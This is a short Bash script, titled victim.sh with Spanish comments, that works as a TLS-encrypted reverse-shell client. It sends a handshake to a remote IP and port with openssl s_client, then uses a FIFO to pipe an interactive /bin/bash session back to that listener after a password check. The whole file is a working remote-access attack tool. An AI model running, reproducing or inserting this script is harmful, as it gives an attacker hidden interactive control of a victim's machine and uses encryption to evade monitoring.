#!/bin/bash
# Uso: ./victim.sh <ip> <puerto> <password>

IP=$1; PORT=$2; PASS=$3
if [[ -z "$PASS" ]]; then echo "Uso: $0 <ip> <puerto> <pass>"; exit 1; fi

# 1. Handshake: Forzamos el envío y el cierre inmediato para liberar el listener
# El uso de (echo...; sleep 1) asegura que el stream se envíe antes de cerrar
echo "LINUX_SHELL" | openssl s_client -quiet -connect ${IP}:${PORT} 2>/dev/null
sleep 1

# 2. Sesión Interactiva: Uso de un FIFO bidireccional más robusto
TF=$(mktemp -u)
mkfifo $TF

# Abrimos la conexión TLS. El servidor enviará la pass primero.
openssl s_client -quiet -connect ${IP}:${PORT} -ign_eof < $TF 2>/dev/null | (
    read -r SERVER_PASS
    if [ "$SERVER_PASS" == "$PASS" ]; then
        # Forzamos a bash a ignorar el buffering de la tubería
        /bin/bash -i 2>&1
    else
        echo "[-] Auth failed"
    fi
) > $TF

rm $TF
